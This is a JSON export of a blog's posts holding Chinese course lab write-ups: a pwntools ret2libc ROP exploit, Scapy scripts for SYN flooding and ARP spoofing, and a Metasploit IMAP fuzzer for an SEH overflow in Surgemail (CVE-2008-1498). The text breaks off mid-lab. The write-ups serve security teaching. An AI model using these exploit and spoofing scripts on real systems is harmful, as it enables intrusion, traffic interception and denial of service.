{"categories":[{"title":"CS61A","uri":"https://qeryu.github.io/categories/cs61a/"},{"title":"Fuzzing","uri":"https://qeryu.github.io/categories/fuzzing/"},{"title":"JavaScrip","uri":"https://qeryu.github.io/categories/javascrip/"},{"title":"lab","uri":"https://qeryu.github.io/categories/lab/"},{"title":"Language","uri":"https://qeryu.github.io/categories/language/"},{"title":"Linux","uri":"https://qeryu.github.io/categories/linux/"},{"title":"LSTM","uri":"https://qeryu.github.io/categories/lstm/"},{"title":"Machine Learning","uri":"https://qeryu.github.io/categories/machine-learning/"},{"title":"Notes","uri":"https://qeryu.github.io/categories/notes/"},{"title":"Web","uri":"https://qeryu.github.io/categories/web/"},{"title":"XML","uri":"https://qeryu.github.io/categories/xml/"},{"title":"网安实践","uri":"https://qeryu.github.io/categories/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5/"}],"posts":[{"content":"20220415信息系统安全（羌卫中老师）课后作业1\n实验环境 操作系统 \u0026amp; 工具   操作系统：5.15.0-kali3-amd64\n  pwntools\nInstallation — pwntools 4.7.0 documentation\napt-get update apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools  由于需要在命令行中使用相关工具（cyclic / readelf / \u0026hellip;），需要将命令行工具所在位置~/.local/bin路径添加到PATH环境变量。linux下查看和添加PATH环境变量\n安装完成后就可以在python环境外调用pwntools相关工具了\n  pwngdb\npwndbg/pwndbg: Exploit Development and Reverse Engineering with GDB Made Easy (github.com)\n安装方式\ngit clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh  安装后命令行输入gdb就能看到\n  ghidra(optional)\n感觉可以用IDA做同样的事，或许是我没用到\nGhidra (ghidra-sre.org)\nReleases · NationalSecurityAgency/ghidra (github.com)\n  待rop程序 #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; void start() { printf(\u0026quot;IOLI Crackme Level 0x00\\n\u0026quot;); printf(\u0026quot;Password:\u0026quot;); char buf[64]; memset(buf, 0, sizeof(buf)); read(0, buf, 256); if (!strcmp(buf, \u0026quot;250382\u0026quot;)) printf(\u0026quot;Password OK :)\\n\u0026quot;); else printf(\u0026quot;Invalid Password!\\n\u0026quot;); } int main(int argc, char *argv[]) { setreuid(geteuid(), geteuid()); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF,0); start(); return 0; }  setvbuf()：设置文件流的缓冲区\n编译 \u0026amp; 系统选项 关闭/开启Stack保护(stack canary)（默认开启）\n-fno-stack-protector -fstack-protector\n关闭NX（默认开启）\n-z execstack\n关闭/开启 pie（默认开启）\n-no-pie -pie\n32bit 编译选项(64bit OS上)（默认64位）\n-m32\nASLR设置（关闭置0）\ncat /proc/sys/kernel/randomize_va_space sudo sysctl -w kernel.randomize_va_space=? (0或2)\n# 完整编译指令 gcc stack.c -o stack -fno-stack-protector  Exp cyclic 获取溢出点 进入pwngdb，使用cyclic命令生成一段100字节的字符串作为输入，可以看到程序崩溃并给出一个无效地址。\n$ gdb ./stack pwndbg\u0026gt; cyclic 50 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa pwndbg\u0026gt; run pwndbg\u0026gt; run Starting program: /home/kali/Desktop/SysSecurity/stack IOLI Crackme Level 0x00 Password:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa  用该地址回到cyclic进行比较，可以知道溢出点的位置是76\n获取PR / PPR / PPPR地址 在命令行中使用ropper工具\nropper --file ./stack_test | grep \u0026quot;pop\u0026quot; | grep \u0026quot;ret\u0026quot;  可以从中找到pop-ret / pop-pop-ret / pop-pop-pop-ret的地址，这是这几个gadget在程序中的偏移地址，在代码中使用时需要加上程序加载的基地址。\n获取libc函数地址 在pwndbg中使用print命令即可获得\n还可以通过readelf工具获取以上函数在libc文件中的偏移地址，从而计算出libc的加载地址\n两个system函数的地址相减可以确定载入地址\n获取特殊字符串位置 # 查找程序中的特殊字符串位置 ropper --file ./stack --string \u0026quot;Password OK\u0026quot; # 或者 ROPgadget --binary ./stack --string 'Password OK'  这里查到的位置是偏移地址\n这是开启了PIE的缘故，如果关闭PIE则会获得执行时的地址\n由于PIE是默认打开的，所以以下还是以PIE打开的情况进行分析\n获取字符串在执行时的位置需要在pwndbg中，在程序执行时使用search命令查找\n# 命令行执行 gdb ./stack # pwndbg执行 b main\t# 在main函数执行前打上断点 r search \u0026quot;Password OK\u0026quot;  获取成功的字符串地址后即可在程序中输出成功提示\n构造payload\npayload = flat(['a'*76, printf_addr, PR, str_print])  也算是完成了参考资料中的一个task1\nTut06-1: Return-oriented Programming - CS6265: Information Security Lab (gts3.org)\nexploit1.py 代码 查找完以上信息后，即可使用这个代码在开PIE关ASLR的环境下exploit了\n#!/usr/bin/env python3 from pwn import * p = process(\u0026quot;./stack\u0026quot;) PR = 0x0000138b PPR = 0x0000138a PPPR = 0x00001389 payload = b'A' * 76 system_addr = 0xf7e00d00 system_offset = 0x00033cc0 libc_addr = system_addr - system_offset puts_addr = 0xf7e2b4e0 printf_addr = 0xf7e0ff10 open_addr = 0xf7ead770 read_addr = 0xf7eadc90 write_addr = 0xf7eadd50 gets_addr = 0xf7e2aa00 exit_addr = 0xf7df3680 str_passwd_ok_offset = 0x00002031 bss_offset = 0x00004038 bss2_offset = 0x00004038 + 20 str_passwd_ok_addr = 0x56557031 load_addr = str_passwd_ok_addr - str_passwd_ok_offset str_passwd_input_offset = 0x00002008 payload += p32(gets_addr) payload += p32(PR + load_addr) payload += p32(bss_offset + load_addr) payload += p32(puts_addr) payload += p32(PR + load_addr) payload += p32(bss_offset + load_addr) payload += p32(open_addr) payload += p32(PPR+ load_addr) payload += p32(bss_offset + load_addr) payload += p32(0) payload += p32(read_addr) payload += p32(PPPR+ load_addr) payload += p32(3) payload += p32(bss2_offset + load_addr) payload += p32(20) payload += p32(write_addr) payload += p32(PPPR+ load_addr) payload += p32(1) payload += p32(bss2_offset + load_addr) payload += p32(20) payload += p32(exit_addr) payload += p32(0xdeadbeef) payload += p32(0) print(payload) p.sendline(payload) p.interactive()  参考内容 基本 ROP - CTF Wiki (ctf-wiki.org)\nTut00: Introduction - CS6265: Information Security Lab (gts3.org)\n","id":0,"section":"posts","summary":"20220415信息系统安全（羌卫中老师）课后作业1 实验环境 操作系统 \u0026amp; 工具 操作系统：5.15.0-kali3-amd64 pwntools Installation — pwntools 4.7.0 documentation apt-get update apt-get install","tags":["pwn","ret2libc"],"title":"信息系统安全Lab1","uri":"https://qeryu.github.io/2022/04/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8lab1/","year":"2022"},{"content":"20220330计算机网络安全（王美珍老师）课后作业1\n实验环境 老师给出的实验环境是Ubuntu 16.04的Seed虚拟机，但官网也有看上去更加舒服的20.04版本Ubuntu的Seed\nSEED Project (seedsecuritylabs.org)\n安装完成后，启动即可\n整体结构如下图所示，HostB为Seed虚拟机，HostA/HostM/Server2为Container\n网络环境 # 模拟Internet的extranet sudo docker network create --subnet=10.0.2.0/24 --gateway=10.0.2.8 --opt \u0026quot;com.docker.network.bridge.name\u0026quot;=\u0026quot;docker1\u0026quot; extranet # 模拟局域网的intranet sudo docker network create --subnet=192.168.60.0/24 --gateway=192.168.60.1 --opt \u0026quot;com.docker.network.bridge.name\u0026quot;=\u0026quot;docker2\u0026quot; intranet  容器配置 # Server2 10.0.2.7 sudo docker run -it --name=Server2 --hostname=Server2 --net=extranet --ip=10.0.2.7 --privileged \u0026quot;seedubuntu\u0026quot; /bin/bash # HostA 192.168.60.2 sudo docker run -it --name=HostA --hostname=HostA --net=intranet --ip=192.168.60.2 --privileged \u0026quot;seedubuntu\u0026quot; /bin/bash # HostM 192.168.60.3 sudo docker run -it --name=HostM --hostname=HostM --net=intranet --ip=192.168.60.3 --privileged \u0026quot;seedubuntu\u0026quot; /bin/bash  工具 依照之前网安实践的指导书，选择HostA/HosM来熟练Scapy应用\n在HostM上（默认是root用户）安装Scapy\napt install python-scapy  在HostA上配置tcpdump（解决可能出现tcpdump找不到链接库的问题）\nmv /usr/sbin/tcpdump /usr/bin/ ln -s /usr/bin/tcpdump /usr/sbin/tcpdump  构造IP报文 在HostM中命令行直接键入scapy即可进入交互界面\n构造一个目的地址dst为HostA(192.168.60.2)的IP报文，并发送\n# HostM ip = IP(dst = \u0026quot;192.168.60.2\u0026quot;) # 目的IP send(ip, iface=\u0026quot;eth0\u0026quot;) # 指定eth0网卡发送  在HostA上通过tcpdump可以查看接收到的报文\n# HostA tcpdump -i eth0 host 192.168.60.3 -n -vv  构造二层报文 在HostM上构建ARP二层报文并发送到HostA\n# HostM sendp( Ether( dst = \u0026quot;ff:ff:ff:ff:ff:ff\u0026quot; ) / ARP( hwsrc = \u0026quot;00:0c:29:72:b2:b5\u0026quot;, psrc = \u0026quot;192.168.60.3\u0026quot;, hwdst = \u0026quot;ff:ff:ff:ff:ff:ff\u0026quot;, pdst = \u0026quot;192.168.60.2\u0026quot; ) / \u0026quot;abc\u0026quot;, iface = \u0026quot;eth0\u0026quot; )  在HostA上通过tcpdump可以看到结果\n在HostA上通过sniff方法查看发出去的ARP包，可以看到编号1/3/5的抓包结果都是发送的ARP报文\n可以更加深入进行查看\n接收IP报文 使用sr()方法由HostM向HostA发送ICMP报文\n# HostM sr(IP(dst = \u0026quot;192.168.60.2\u0026quot;) / ICMP())  HostA响应了这个包，Results中显示：ICMP:1\n如果向同一网段中不存在的IP发送ICMP包，则会触发广播，但是广播也没人回应，毕竟不存在，可以强行中断\nResults中显示：ICMP:0，同时Unanswered中显示：ICMP:1\n可以分别查看Results和Unanswered中具体的内容\n接收二层报文 同上，由HostM向HostA发二层报文并接收返回信息\n# HostM results, unanswered = srp( Ether( dst = \u0026quot;ff:ff:ff:ff:ff:ff\u0026quot; ) / ARP ( pdst = \u0026quot;192.168.60.0/24\u0026quot; ), timeout = 5, iface = \u0026quot;eth0\u0026quot; )  由于向整个网段发送ARP报文耗时较长，所以此处设置timeout为5秒\n发送完成后，通过results/unanswered中的内容可以看到响应结果\n192.168.60.1是网关，也就是seed虚拟机本身\n192.168.60.2是HostA，除此之外没有其他同网段的主机了\n构造四层报文 启动HostA的HTTP服务 这里根据要求使用了Apache2，由于是在docker环境下完成，所以无法使用systemctl命令\nserver - systemctl failed to connect to bus - docker ubuntu:16.04 container - Ask Ubuntu\n# HostA service apache2 start service apache2 status  可能出现如下问题\n解决办法apache2 - Having problem while starting apache server - Ask Ubuntu\n# HostA mkdir /run mkdir /run/lock  启动完成后，在HostM上可以通过以下命令检验\nwget http://192.168.60.2  应有结果\n构造TCP-SYN报文 在HostM中构造如下报文并发送\n# HostM results, unanswered = sr( IP(dst = \u0026quot;192.168.60.2\u0026quot;) / TCP(sport = 30, dport = 80, flags = \u0026quot;S\u0026quot;) )  该报文的源端口为30，目的端口为80，即HostA开启http服务的端口，flags = \u0026ldquo;S\u0026quot;表示是一个TCP-SYN报文\nHostA中tcpdump获取的记过如下图所示\n在HostM中查看results结果，可以看到HostA返回了一个flags = \u0026ldquo;SA\u0026quot;的报文，即回复了ACK报文\n构造报文时可以随机生成端口\n# HostM 随机生成1-65535的数字（也就是端口号的合法范围中的随机数字） results, unanswered = sr( IP(dst = \u0026quot;192.168.60.2\u0026quot;) / TCP(sport = RandShort(), dport = 80, flags = \u0026quot;S\u0026quot;) ) # HostM 随机生成指定范围的端口号，避开可能已经被其他应用使用的端口 results, unanswered = sr( IP(dst = \u0026quot;192.168.60.2\u0026quot;) / TCP(sport = RandNum(1000, 1500), dport = 80, flags = \u0026quot;S\u0026quot;) ) # HostM 还可以使用fuzz方法随机地补全未指定内容 results, unanswered = sr( IP(dst = \u0026quot;192.168.60.2\u0026quot;) / fuzz(TCP(dport = 80, flags = \u0026quot;S\u0026quot;)) )  随机生成了21235源端口号\n嗅探 以下是sniff方法的一些参数\n在HostM上嗅探HostA发送的ICMP报文\n# HostM data = sniff(filter = \u0026quot;icmp and host 192.168.60.2\u0026quot;, count = 3)  下图是HostA ping了几次HostM的嗅探结果\n#!/usr/bin/python3 from scapy.all import * print(\u0026quot;SNIFFING PACKETS ..........\u0026quot;) def print_pkt(pkt): print(\u0026quot;Source IP:\u0026quot;, pkt[IP].src) print(\u0026quot;Destination IP:\u0026quot;, pkt[IP].dst) print(\u0026quot;Protocol:\u0026quot;, pkt[IP].proto) print(\u0026quot;\\n\u0026quot;) pkt = sniff(filter = \u0026quot;ip\u0026quot;, prn = print_pkt)  监听TCP\n#!/usr/bin/python3 from scapy.all import * print(\u0026quot;SNIFFING PACKETS ..........\u0026quot;) def print_pkt(pkt): print(\u0026quot;Source IP:\u0026quot;, pkt[IP].src) print(\u0026quot;Source Port:\u0026quot;, pkt[IP][TCP].sport) print(\u0026quot;Destination IP:\u0026quot;, pkt[IP].dst) print(\u0026quot;Destination Port:\u0026quot;, pkt[IP][TCP].dport) print(\u0026quot;Protocol:\u0026quot;, pkt[IP].proto) print(\u0026quot;\\n\u0026quot;) pkt = sniff(filter = \u0026quot;tcp\u0026quot;, prn = print_pkt)  syn-flooding 攻击 #!/usr/bin/python from scapy.all import * from ipaddress import IPv4Address from random import getrandbits def __get_random_ip(): return str(IPv4Address(getrandbits(32))) i = 0 while True: print(i) send( IP( src = __get_random_ip(), dst = \u0026quot;192.168.60.2\u0026quot;, id = 2345 + i ) / TCP ( sport = RandShort(), dport = 80, flags = \u0026quot;S\u0026quot; ) ) i = i + 1  攻击效果（但是在访问HostA的web服务的过程中并未感受到Dos）\narp-spoofing 攻击 #!/usr/bin/python from scapy.all import * def getmac(ip): arp_p = Ether(dst=\u0026quot;ff:ff:ff:ff:ff:ff\u0026quot;)/ARP(op=1, pdst=ip) ans = srp(arp_p, timeout=2, verbose=False) return ans[0].res[0][1][1].fields['hwsrc'] def spoofarpcache(target_ip, target_mac, source_ip): spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac) send(spoofed, verbose=False) def restorearp(target_ip, target_mac, source_ip, source_mac): packet = ARP(op=2, hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip) send(packet, verbose=False) print(\u0026quot;ARP Table restored to normal\u0026quot;, target_ip) def main(): target_ip = \u0026quot;192.168.60.2\u0026quot; gateway_ip = \u0026quot;192.168.60.1\u0026quot; try: target_mac = getmac(target_ip) print(\u0026quot;Target MAC:\u0026quot;, target_mac) except: print(\u0026quot;Target machine did not respond ARP broadcast.\u0026quot;) quit() try: gateway_mac = getmac(gateway_ip) print(\u0026quot;Gateway MAC:\u0026quot;, gateway_mac) except: print(\u0026quot;Gateway is unreachable.\u0026quot;) quit() try: print(\u0026quot;Sending spoofed ARP responses.\u0026quot;) while True: spoofarpcache(target_ip, target_mac, gateway_ip) spoofarpcache(gateway_ip, gateway_mac, target_ip) except: pirnt(\u0026quot;ARP spoofing stopped.\u0026quot;) restorearp(gateway_ip, gateway_mac, target_ip, target_mac) restorearp(target_ip, target_mac, gateway_ip, gateway_mac) quit() if __name__ == \u0026quot;__main__\u0026quot;: main()  使用arp欺骗前\n   名字 IP MAC     HostA 192.168.60.2 02:42:c0:a8:3c:02   HostM 192.168.60.3 02:42:c0:a8:3c:03   HostB 192.168.60.1 02:42:66:24:d2:a2    被攻击主机HostA\n攻击者HostM\n被欺骗网关HostB\n执行arp欺骗后\n被攻击主机HostA上，HostB 192.168.60.1的MAC已经被改为HostM的MAC\n被欺骗网关HostB上，HostA 192.168.60.2的MAC已经被改为HostM的MAC\ntcp-reset 攻击 tcp-hijack 攻击 ","id":1,"section":"posts","summary":"20220330计算机网络安全（王美珍老师）课后作业1 实验环境 老师给出的实验环境是Ubuntu 16.04的Seed虚拟机，但官网也有看上去更","tags":["seed","docker","scapy","syn-flooding","arp-spoofing"],"title":"计算机网络安全 Scapy实验","uri":"https://qeryu.github.io/2022/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-scapy%E5%AE%9E%E9%AA%8C/","year":"2022"},{"content":"2021年第四次网安实践内容笔记\n实验环境 操作系统  攻击机Attacker：Linux kali 5.7.0-kali1-amd64 #1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64 GNU/Linux 靶机Target：Windows XP Professional 2002 Service Pack 3  Metasploit  版本Version：  Framework: 6.0.41-dev Console : 6.0.41-dev    漏洞简述 CVE-2008-1498 NetWin Surgemail 3.8k4-4 - IMAP (Authenticated) Remote LIST Universal\n有关漏洞的基础信息在该网站上都有，包括：\n 用于演示的特定版本的Surgemail Python的漏洞利用Exploit代码  漏洞内容 NetWin Surgemail 3.8k4-4和更早版本中的IMAP服务，会允许能够完成身份验证的用户，通过构造一个超长的LIST命令的参数，来利用堆栈缓冲区溢出的漏洞，达到执行任意代码的目的。\n模糊测试 Fuzz 模糊测试简单来说就是自动化生成大量随机的、非预期的输入，触发一些平常很难触及的程序逻辑分支，以期让目标程序Crash\n对导致目标程序Crash的输入内容进行分析，有可能发现目标程序的一些漏洞。\n[翻译]模糊测试: 初学者入门指南-外文翻译-看雪论坛-安全社区|安全招聘|bbs.pediy.com\n结构化异常处理 SEH 什么是异常处理Exception Handler 异常处理Exception Handler是程序中用于处理程序运行中的报错的代码，一般表现为如下的try-catch结构\ntry { // 尝试运行的代码，如果无法出现异常则跳转到catch中的代码处理异常 } catch { // 当异常出现时用于处理异常的代码 }  而SEH是结构化异常处理的简称（Structure Exception Handler），是Windows操作系统用于处理异常的一种数据结构，每个SEH包含两个DWORD指针，分别为：\n DWORD: Pointer to next SEH record  指向下一个SEH，如果当前SEH无法处理这个异常，将会从当前跳转到下一个   DWORD: Pointer to Exception Handler  指向保存异常处理的代码，即常说的Exception Handler代码    SEH是基于线程的，当线程初始化的时候，Windows系统会自动向栈中安装一个SEH作为线程默认的异常处理，即直接退出线程，弹窗报错 “xxx has encountered a problem and needs to close” 。\n如果源程序代码中使用了异常处理机制，如try-catch结构或者Assert断言，编译器将会根据这些内容向当前函数的栈帧中安装一个SEH。所以一般来说，栈中一般会同时存在多个SEH，这些SEH以链式的结构进行存储，称为SEH-chain。\n在栈上的保存结构如下图\n当出现异常时 当系统开始处理出现的异常时，会开始调用EXCEPTION_DISPOSITION函数，此时在ESP+8的位置存放着Establisher Frame指针，该指针指向SEH-chain中的第一个SEH的第一个DWORD指针，即指向了一个指向了下一个SEH的指针。此时程序开始执行第一个SEH的Exception Handler部分。\n我们要做的SEH溢出漏洞利用，攻击串的结构如下所示：\n[一段任意的缓冲区填充 | NOP空指令滑行区 | ShellCode | Near JMP | Short JMP | PPR]\n我们所要做的是，让攻击串的Short JMP指令（四个字节）覆盖第一个SEH结构的第一个DWORD指针，即覆盖指向下一个SEH的指针，让攻击串中的指向pop-pop-ret序列的指针，覆盖第一个SEH的第二个DWORD指针，即覆盖EH。\n从上文可以看出，SEH漏洞利用几乎是要和pop-pop-ret序列绑定的。\n当处理异常的过程中，系统尝试使用第一个SEH的EH指向的代码处理异常时，将会根据地址找到我们预先找好的pop-pop-ret序列，两个pop指令执行结束后，ESP就指向了Establisher Frame指针，此时再执行一次ret指令，将会引导EIP指向Establisher Frame所保存的地址，即指向了栈中第一个SEH的第一个DWORD指针，即下一条命令执行Short JMP。\n执行一次短跳转后，EIP将被我们引导到更低地址的近跳转Near JMP，再通过一次跳转，将EIP引导到较远的位置，再通过NOP指令让EIP滑到ShellCode的起始位置，来执行比较长的ShellCode。\n图示如下\n为什么不直接让EH指向ShellCode 因为根据操作系统不同，版本不同，被读入的攻击串的存放地址也是不同的。\n直接给EH指定ShellCode地址的话，如果换了另一个操作系统，比如Windows 7，那脚本在攻击过程中是大概率找不到ShellCode的。\n因为存在这种问题，所以要尽量使用程序中已有的信息，不依赖于绝对的地址，来构建更加具有泛用性的攻击脚本。\n为什么要用两次跳转 因为一个DWORD是4个字节，一次近跳转是5个字节，而一次短跳转是4个字节。\n显然无法直接填充一个近跳转，但是填充短跳转的话，跳转距离又不够写入ShellCode的，所以就需要跳转两次，将EIP引导到较远的位置，再通过NOP指令让EIP滑到ShellCode的起始位置，来执行比较长的ShellCode。\n参考资料 攻击windows异常处理机制SEH_0pt1mus-CSDN博客\nExploit writing tutorial part 3 : SEH Based Exploits | Corelan Cybersecurity ResearchCorelan Cybersecurity Research\n结构化异常SEH处理机制详细介绍(一） - 活着的虫子 - 博客园 (cnblogs.com)\nThe need for a POP POP RET instruction sequence | Dimitrios Kalemis (wordpress.com)\n具体操作流程 脚本保存位置\n~/.msf4/modules/脚本具体分类  这个保存位置一般都是保存的用户自己写的脚本。\n这里和老师的课件内容不一样，课件是直接把内容保存在了/usr/share/metasploit-framework/modules中，如果把自己的脚本也保存在那个文件夹下，可能会破坏原有的Metasploit的主干代码。\n靶机上安装Surgemail以及Immunity Debugger Surgemail的安装包可以从靶机上直接拿，也可以从上文提到的官网上下载对应含有漏洞的版本。\nImmunity Debugger靶机上也直接有，也可以去网上找Immunity Debugger (immunityinc.com)官网下载\n需要注意的是，因为Surgemail是系统服务，所以Immunity Debugger需要用系统的管理员权限来运行，靶机的用户密码是test\n命令行开启关闭Surgemail服务 net start surgemail # 主动开启Surgemail服务 net stop surgemail # 主动关闭Surgemail服务  在每次发生Crash之后，Surgemail大概率都会进入异常，需要手动关闭（有可能他自己已经关了）然后再手动开启。\n管理员权限运行Immunity Debugger 右键点击安装好的Immunity Debugger\n进入之后，Attach到当前正在运行的Surgemail服务上\n需要注意的是，刚Attach上去的时候，Debugger会处于Paused状态，需要手动点一下上面的运行。\n模糊测试找到Crash点 在进行漏洞利用之前首先需要检查靶机上是否存在漏洞，常见方法就是进行模糊测试Fuzz，以下是书中提供的脚本\n模糊测试脚本，做了一些小修改，目前保证可以在我的电脑上稳定跑：\nrequire 'msf/core' # POINT A class Metasploit4 \u0026lt; Msf::Auxiliary # POINT B include Msf::Exploit::Remote::Imap # POINT C include Msf::Auxiliary::Dos # POINT D def initialize # POINT E super( 'Name' =\u0026gt; 'Simple IMAP Fuzzer', 'Description' =\u0026gt; %q{ An example of how to build a simple IMAP fuzzer. Account IMAP credentials are required in this fuzzer. }, 'Author' =\u0026gt; [ 'ryujin' ], 'License' =\u0026gt; MSF_LICENSE, 'Version' =\u0026gt; '$ Revision: 1 $' ) end def fuzz_str return Rex::Text.rand_text_alphanumeric(rand(4096)) # POINT F end def run # POINT G srand(0) while (true) connected = connect_login() # POINT H if not connected print_status('Host is not responding - this is G00D ;)') break end print_status('Generating fuzzed data...') fuzzed = fuzz_str() # POINT I print_status( \u0026quot;Sending fuzzed data, buffer length = %d\u0026quot; % fuzzed.length ) req = '0002 LIST () \u0026quot;/' req += fuzzed + '\u0026quot; \u0026quot;PWNED\u0026quot;' + \u0026quot;\\r\\n\u0026quot; # POINT J print_status(req) res = raw_send_recv(req) # POINT K if !res.nil? print_status(res) else print_status('Server crashed, no response') break end disconnect() # POINT L end end end  保存脚本 将该脚本保存到~/.msf4/modules/auxiliary/fuzzers/imap_fuzz.rb\n如果不想重新打开MSF窗口来重新载入这个新加的脚本，可以在MSF中（不是在bash里）\nreload_all use auxiliary/fuzzers/imap_fuzz  设置参数 set imapuser \u0026lt;user\u0026gt; # 安装Surgemail的时候注册用户名 set imappass \u0026lt;pass\u0026gt; # 对应用户的密码 set rhosts 192.168.xxx.xxx # 靶机IP地址  运行脚本 msf6 auxiliary(fuzzers/imap_fuzz) \u0026gt; exploit  结果如下\n这时来到靶机的Debugger中，发现Surgemail进程已经因为错误而停止运行了\n对脚本内容的一些解释 Point A require 'msf/core' # POINT A  我们将包含核心库中的所有功能。\nMSF具有模块化结构，分为以下几部分：框架核心，基础和ui。\n关于MSF架构的完整讨论不在讨论范围之内，MSF地核心库提供了很多接口，它提供了与漏洞利用模块，会话，插件等进行交互的必需功能。具体内容可参见Metasploit Developer’s Guide\nPoint B class Metasploit4 \u0026lt; Msf::Auxiliary # POINT B  我们开始定义类并从Msf::Auxiliary继承。 Metasploit的auxiliary模块的特殊之处在于，它们不一定是带有有效Payload的漏洞利用程序。 相反，它们可以被视为侦察工具。 这包括端口扫描程序，模糊测试，信息收集等工具。\nPoint C \u0026amp; D include Msf::Exploit::Remote::Imap # POINT C include Msf::Auxiliary::Dos # POINT D  如参考资料“第14章所述”，这部分混入（Mixin）了IMAP类和DoS类。\n 关于Mixin，它是Ruby的include语法、Python的多重继承语法实现的一种编程模式，和Java中的多重继承的语法差不多，Ruby中是将其他模块include到类的定义中，其他模块中的方法、变量都会被mix到新定义的类中。\n 引用IMAP类可以让你使用它的登录功能，即登录到Surgemail服务\n这个Fuzz测试器的目的则是让服务器崩溃，即这个模块将导致DoS（拒绝服务）\n混入（Mixin）让该模块（module）有了IMAP类的登录功能与DoS类中的一些变量，这些内容在后面都会用到。可以看到，这个脚本中并没有提到imapuser、imappass、rhosts、rport变量，但是在设置参数的时候这些变量都存在，这些变量就是从这两个类中混入得到的。\nPoint E def initialize # POINT E super( 'Name' =\u0026gt; 'Simple IMAP Fuzzer', 'Description' =\u0026gt; %q{ An example of how to build a simple IMAP fuzzer. Account IMAP credentials are required in this fuzzer. }, 'Author' =\u0026gt; [ 'ryujin' ], 'License' =\u0026gt; MSF_LICENSE, 'Version' =\u0026gt; '$ Revision: 1 $' ) end  引用父类即IMAP类和DoS类中的属性编辑构造函数initialize()\n其实就是给这个脚本补充了一些信息，比如名字、描述、作者之类的。\nPoint F def fuzz_str return Rex::Text.rand_text_alphanumeric(rand(4096)) # POINT F end  这里是用于生成发送给服务器的字符串的fuzz_str方法。\n目前设置的是生成长度最大为4096字节的一个由字母和数字组成（alphanumeric）的随机化（rand）串。\nRex也是Metasploit的基本部分之一，它是Ruby语言的一个拓展库，可以将其视为Metasploit自己的Ruby API。Rex可以提供一系列的类，例如生成汇编指令、缓冲区编码、基本日志记录、将任务分解为单独的作业等。\nPoint G 覆写（override）了父类中的run()方法，当用户在MSF中执行run指令时，这个方法将会被调用。如果当前模块不是auxiliary模块，而是一个exploit模块的话，我们将会覆写（override）exploit()方法。\nPoint H connected = connect_login() # POINT H  使用IMAP类中的connect_login()方法来连接到IMAP服务器，并提交自己的账号密码来进行身份验证。将会对靶机（由RHOSTS和RPORT来确定），使用给定的身份信息（IMAPUSER和IMAPPASS）进行登录。\n如果连接失败的话，循环将会终止，一般此时就是服务器没有相应，表示服务器已经被我们生成的随机串搞到Crash了。\nPoint I \u0026amp; J \u0026amp; K fuzzed = fuzz_str() # POINT I req = '0002 LIST () \u0026quot;/' req += fuzzed + '\u0026quot; \u0026quot;PWNED\u0026quot;' + \u0026quot;\\r\\n\u0026quot; # POINT J print_status(req) res = raw_send_recv(req) # POINT K  生成随机字符串，然后构造发给Surgemail服务的LIST()命令，然后把命令发给靶机，获取返回的信息。\n如果没有收到任何返回信息，说明服务已经停止，此时循环将会中断，在攻击机上打印“Server crashed, no response”表示靶机已经Crash了。如果收到返回信息，将会在攻击机上打印收到的返回信息。\nPoint L disconnect() # POINT L  如果能够正常执行以上所有内容，正常连接、正常构造、正常发送、正常获得返回信息，脚本将在一轮循环的最后断开连接，然后开启下一轮循环，直至服务器Crash。\n定位SEH的Exception Handler的具体位置 确定能覆盖SEH内容的输入串长度 经过一些尝试，以及参考资料提供的信息，当输入串的长度为11000的时候，通过靶机上的Debugger可以发现，SEH部分的内存已经被覆盖。可以通过修改脚本验证，将输入串的生成从随机生成修改为如下内容：\nfuzzed = 'A' * 11000 # 注意上面不需要再调用fuzz_str()来生成了 print_status(\u0026quot;Sending fuzzed data, buffer length = %d\u0026quot; % fuzzed.length) req = '0002 LIST () \u0026quot;/' + fuzzed + '\u0026quot; \u0026quot;PWNED\u0026quot;' + \u0026quot;\\r\\n\u0026quot;  在MSF中执行\nrexploit  该命令可以无需重新reload_all所有的脚本，会重新载入这个脚本，然后沿用之前定好的变量内容，重新exploit，可以看到攻击机这边\n在靶机这边的Debugger中也能看到，SEH内容已经被大量的A覆盖\n通过View - SEH chain可以查看当前进程的SEH链，也可以从内存中看到大量A\n通过不重复随机串定位EH的位置 为了准确覆盖EH，需要定位EH对于输入起始位置的偏移量，将脚本中fuzzed内容修改如下\nfuzzed = Rex::Text.pattern_create(11000)  pattern_create()会生成一个长度为11000的串，其四字节长度的子串是不重复的\n执行结果如下：\n在靶机可以查看第一个SEH的EH部分被覆盖的内容：\n可以看到第一个SEH的EH被覆盖为了“684E3368”（在其他环境中运行可能是其他的串，但是在网安实践给出的环境中应该都是这个值）。\n然后拿着这个覆盖的内容，回到Kali，使用MSF中，/usr/share/metasploit-framework/tools/exploit 中的pattern_offset脚本，可以查看对应的偏移量。\ncd /usr/share/metasploit-framework/tools/exploit/ ./pattern_offset.rb -q 684E3368 -l 11000  可以看到EH对应的4个字节的偏移量为，10361-10364\n可以通过修改脚本对该偏移量进行一些验证，修改fuzzed内容如下\nfuzzed = \u0026quot;\\x41\u0026quot; * 10360 + \u0026quot;\\x42\u0026quot; * 4 + \u0026quot;\\x43\u0026quot; * 636  再次rexploit运行脚本，来到靶机查看seh-chain 的内容发现EH内容已经被覆盖为我们特殊构造的\\x42\n再右键点击EH，选择Follow address in 